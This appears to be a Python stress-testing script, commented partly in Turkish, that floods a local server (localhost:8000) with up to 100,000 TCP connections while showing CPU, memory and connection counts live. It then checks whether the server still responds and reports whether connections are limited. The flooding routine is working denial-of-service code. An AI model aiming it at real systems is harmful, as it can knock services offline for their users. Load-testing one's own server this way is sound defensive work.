"""
ULTIMATE DoS Test - Server Monitoring Dahil
Anlık server durumu gösterir!
"""

import socket
import time
import psutil
import threading
from datetime import datetime
from colorama import init, Fore, Style
import sys

init()

# Global stats
stats = {
    "successful": 0,
    "failed": 0,
    "active_sockets": []
}

# Monitoring thread
monitoring = {"active": False}

def get_server_stats():
    """Server kaynak kullanımını al"""
    cpu_percent = psutil.cpu_percent(interval=0.1)
    memory = psutil.virtual_memory()
    
    # Network connections count
    connections = psutil.net_connections(kind='tcp')
    established = sum(1 for c in connections if c.status == 'ESTABLISHED')
    syn_sent = sum(1 for c in connections if c.status == 'SYN_SENT')
    
    return {
        "cpu": cpu_percent,
        "memory_percent": memory.percent,
        "memory_mb": memory.used / (1024 * 1024),
        "tcp_established": established,
        "tcp_syn_sent": syn_sent
    }

def monitor_server_health(duration=30):
    """Server sağlığını gerçek zamanlı izle"""
    print(f"{Fore.YELLOW}{'═' * 80}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}REAL-TIME SERVER MONITORING{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'═' * 80}{Style.RESET_ALL}\n")
    
    start_time = time.time()
    
    while monitoring["active"] and (time.time() - start_time) < duration:
        try:
            server_stats = get_server_stats()
            
            # Progress bar for CPU
            cpu_bar = "█" * int(server_stats["cpu"] / 2)
            cpu_bar = cpu_bar.ljust(50, "░")
            
            # Progress bar for Memory
            mem_bar = "█" * int(server_stats["memory_percent"] / 2)
            mem_bar = mem_bar.ljust(50, "░")
            
            # Color based on load
            cpu_color = Fore.GREEN if server_stats["cpu"] < 50 else (Fore.YELLOW if server_stats["cpu"] < 80 else Fore.RED)
            mem_color = Fore.GREEN if server_stats["memory_percent"] < 50 else (Fore.YELLOW if server_stats["memory_percent"] < 80 else Fore.RED)
            
            # Real-time display
            sys.stdout.write(f"\r{Fore.CYAN}[MONITOR]{Style.RESET_ALL} ")
            sys.stdout.write(f"CPU: {cpu_color}[{cpu_bar}] {server_stats['cpu']:5.1f}%{Style.RESET_ALL} | ")
            sys.stdout.write(f"MEM: {mem_color}[{mem_bar}] {server_stats['memory_percent']:5.1f}%{Style.RESET_ALL} | ")
            sys.stdout.write(f"TCP: {Fore.YELLOW}{server_stats['tcp_established']:4d} est{Style.RESET_ALL} | ")
            sys.stdout.write(f"{Fore.RED}{server_stats['tcp_syn_sent']:4d} syn{Style.RESET_ALL} | ")
            sys.stdout.write(f"Active: {Fore.CYAN}{len(stats['active_sockets']):5d}{Style.RESET_ALL}")
            sys.stdout.flush()
            
            time.sleep(0.5)
            
        except Exception as e:
            pass
    
    print("\n")

def print_banner():
    banner = f"""
{Fore.RED}
╔═══════════════════════════════════════════════════════╗
║   🔴🔴🔴 ULTIMATE DoS TEST + MONITORING 🔴🔴🔴         ║
║   Real-Time Server Resource Tracking                  ║
╠═══════════════════════════════════════════════════════╣
║  Target: localhost:8000                               ║
║  Features: CPU, Memory, Network monitoring            ║
║  Max: 100,000 connections                             ║
╚═══════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
    print(banner)

def create_massive_connections(host, port, count, batch_size=100):
    """Toplu half-open connection oluştur"""
    
    print(f"{Fore.RED}[ATTACK] {count} adet connection flood başlatılıyor...{Style.RESET_ALL}\n")
    
    batches = count // batch_size
    
    # Start monitoring dalam ayrı thread
    monitoring["active"] = True
    monitor_thread = threading.Thread(target=monitor_server_health, args=(60,), daemon=True)
    monitor_thread.start()
    
    time.sleep(1)  # Monitor başlasın
    print("\n")  # Monitor için yer aç
    
    for batch in range(batches):
        batch_start = time.time()
        batch_sockets = []
        
        for i in range(batch_size):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setblocking(False)
                
                try:
                    sock.connect((host, port))
                except BlockingIOError:
                    pass
                except Exception:
                    stats["failed"] += 1
                    continue
                
                batch_sockets.append(sock)
                stats["successful"] += 1
                
            except Exception:
                stats["failed"] += 1
        
        stats["active_sockets"].extend(batch_sockets)
        
        batch_time = (time.time() - batch_start) * 1000
        
        # Progress (monitoring altına yazdır)
        if batch % 5 == 0:  # Her 5 batch'te bir
            # Move cursor down
            print(f"\n{Fore.GREEN}[Batch {batch+1}/{batches}] {len(batch_sockets)} conn | "
                  f"Total: {len(stats['active_sockets'])} | Progress: {((batch+1)/batches)*100:.0f}%{Style.RESET_ALL}", end="")
            # Move cursor back up
            sys.stdout.write("\033[F\033[F")  # 2 satır yukarı
    
    monitoring["active"] = False
    monitor_thread.join(timeout=2)
    
    print("\n\n\n")  # Monitoring için boşluk
    
    return stats["active_sockets"]

def stress_test_with_monitoring(host, port, total_connections=10000):
    """Monitoring ile DoS testi"""
    
    # Initial server state
    print(f"{Fore.CYAN}{'─' * 80}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}BASELINE SERVER STATUS (BEFORE ATTACK){Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'─' * 80}{Style.RESET_ALL}\n")
    
    baseline = get_server_stats()
    print(f"CPU: {baseline['cpu']:.1f}%")
    print(f"Memory: {baseline['memory_percent']:.1f}% ({baseline['memory_mb']:.0f}MB)")
    print(f"TCP Established: {baseline['tcp_established']}")
    print(f"TCP SYN_SENT: {baseline['tcp_syn_sent']}\n")
    
    # Attack!
    print(f"{Fore.RED}{'═' * 80}{Style.RESET_ALL}")
    print(f"{Fore.RED}PHASE 1: MASSIVE FLOOD WITH REAL-TIME MONITORING{Style.RESET_ALL}")
    print(f"{Fore.RED}{'═' * 80}{Style.RESET_ALL}\n")
    
    start_time = time.time()
    sockets = create_massive_connections(host, port, total_connections, batch_size=200)
    flood_time = time.time() - start_time
    
    # After attack stats
    print(f"\n{Fore.YELLOW}{'─' * 80}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}ATTACK COMPLETED - FINAL SERVER STATE{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'─' * 80}{Style.RESET_ALL}\n")
    
    final = get_server_stats()
    
    print(f"Attack Duration: {flood_time:.2f}s")
    print(f"Connections/sec: {len(sockets)/flood_time:.0f}\n")
    
    print(f"CPU: {baseline['cpu']:.1f}% → {final['cpu']:.1f}% "
          f"({Fore.RED}+{final['cpu']-baseline['cpu']:.1f}%{Style.RESET_ALL})")
    print(f"Memory: {baseline['memory_percent']:.1f}% → {final['memory_percent']:.1f}% "
          f"({Fore.RED}+{final['memory_percent']-baseline['memory_percent']:.1f}%{Style.RESET_ALL})")
    print(f"TCP ESTABLISHED: {baseline['tcp_established']} → {final['tcp_established']} "
          f"({Fore.RED}+{final['tcp_established']-baseline['tcp_established']}{Style.RESET_ALL})")
    print(f"TCP SYN_SENT: {baseline['tcp_syn_sent']} → {final['tcp_syn_sent']} "
          f"({Fore.RED}+{final['tcp_syn_sent']-baseline['tcp_syn_sent']}{Style.RESET_ALL})\n")
    
    print(f"{Fore.RED}Active Half-Open: {len(sockets)}{Style.RESET_ALL}")
    print(f"Failed: {stats['failed']}\n")
    
    # Health check
    print(f"{Fore.RED}{'═' * 80}{Style.RESET_ALL}")
    print(f"{Fore.RED}PHASE 2: SERVER HEALTH CHECK UNDER LOAD{Style.RESET_ALL}")
    print(f"{Fore.RED}{'═' * 80}{Style.RESET_ALL}\n")
    
    for attempt in range(1, 6):
        try:
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_sock.settimeout(10)
            
            test_start = time.time()
            test_sock.connect((host, port))
            test_time = (time.time() - test_start) * 1000
            test_sock.close()
            
            if test_time > 5000:
                print(f"[{attempt}] {Fore.YELLOW}⚠️  SLOW! ({test_time:.0f}ms) - Server struggling{Style.RESET_ALL}")
            elif test_time > 1000:
                print(f"[{attempt}] {Fore.YELLOW}⚠️  Delayed ({test_time:.0f}ms){Style.RESET_ALL}")
            else:
                print(f"[{attempt}] {Fore.GREEN}✅ OK ({test_time:.0f}ms){Style.RESET_ALL}")
            
            time.sleep(1)
            
        except socket.timeout:
            print(f"[{attempt}] {Fore.RED}❌ TIMEOUT - SERVER DOWN!{Style.RESET_ALL}")
            break
        except Exception as e:
            print(f"[{attempt}] {Fore.RED}❌ ERROR: {e}{Style.RESET_ALL}")
    
    # Resource impact
    print(f"\n{Fore.RED}{'═' * 80}{Style.RESET_ALL}")
    print(f"{Fore.RED}RESOURCE IMPACT ANALYSIS{Style.RESET_ALL}")
    print(f"{Fore.RED}{'═' * 80}{Style.RESET_ALL}\n")
    
    print(f"Half-Open Connections: {Fore.RED}{len(sockets)}{Style.RESET_ALL}")
    print(f"Estimated Memory: ~{Fore.RED}{len(sockets) * 4 / 1024:.1f}MB{Style.RESET_ALL}")
    print(f"Network Buffers: ~{Fore.RED}{len(sockets) * 16 / 1024:.1f}MB{Style.RESET_ALL}\n")
    
    # Sustained monitoring
    print(f"{Fore.YELLOW}Sustained load monitoring (15s)...{Style.RESET_ALL}\n")
    monitoring["active"] = True
    monitor_thread = threading.Thread(target=monitor_server_health, args=(15,), daemon=True)
    monitor_thread.start()
    monitor_thread.join()
    
    # Cleanup
    print(f"\n{Fore.YELLOW}{'─' * 80}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}CLEANUP...{Style.RESET_ALL}\n")
    
    for i, sock in enumerate(sockets):
        try:
            sock.close()
            if (i + 1) % 500 == 0:
                sys.stdout.write(f"\r{Fore.GREEN}[{i+1}/{len(sockets)}] Closing... {((i+1)/len(sockets))*100:.0f}%{Style.RESET_ALL}")
                sys.stdout.flush()
        except:
            pass
    
    print(f"\n{Fore.GREEN}✅ Cleanup complete{Style.RESET_ALL}\n")
    
    # Final verdict
    print(f"{Fore.RED}{'═' * 80}{Style.RESET_ALL}")
    print(f"{Fore.RED}VERDICT{Style.RESET_ALL}")
    print(f"{Fore.RED}{'═' * 80}{Style.RESET_ALL}\n")
    
    if len(sockets) > 1000:
        print(f"{Fore.RED}🔴 CRITICAL VULNERABILITY!{Style.RESET_ALL}")
        print(f"   {len(sockets)} half-open connections accepted")
        print(f"   No connection limit!")
        print(f"   Server can be CRASHED with real attack!\n")
    else:
        print(f"{Fore.GREEN}✅ Server has connection limits{Style.RESET_ALL}\n")

if __name__ == "__main__":
    print_banner()
    
    # Check psutil
    try:
        psutil.cpu_percent()
    except:
        print(f"{Fore.RED}❌ psutil not installed!{Style.RESET_ALL}")
        print(f"Run: py -m pip install psutil\n")
        exit(1)
    
    print(f"{Fore.RED}{'!' * 80}{Style.RESET_ALL}")
    print(f"{Fore.RED}⚠️⚠️⚠️  ULTIMATE DoS TEST WITH MONITORING ⚠️⚠️⚠️{Style.RESET_ALL}")
    print(f"{Fore.RED}{'!' * 80}{Style.RESET_ALL}\n")
    
    print(f"{Fore.CYAN}Connection count:{Style.RESET_ALL}")
    print(f"  100 - hafif")
    print(f"  1000 - Medium")
    print(f"  10000 - Heavy")
    print(f"  50000 - Extreme")
    print(f"  100000 - {Fore.RED}AĞIR{Style.RESET_ALL}\n")
    
    try:
        count = int(input(f"{Fore.CYAN}Count (default 10000): {Style.RESET_ALL}") or "10000")
        
        if count > 10000:
            print(f"\n{Fore.RED}⚠️  {count} is VERY RISKY!{Style.RESET_ALL}")
            confirm = input(f"{Fore.RED}Type YES to continue: {Style.RESET_ALL}")
            if confirm != "YES":
                print(f"{Fore.YELLOW}Cancelled{Style.RESET_ALL}")
                exit(0)
    except ValueError:
        count = 10000
    
    print(f"\n{Fore.GREEN}Starting {count} connections test...{Style.RESET_ALL}\n")
    time.sleep(2)
    
    stress_test_with_monitoring("localhost", 8000, total_connections=count)
    
    print(f"{Fore.GREEN}✅ Test complete!{Style.RESET_ALL}\n")
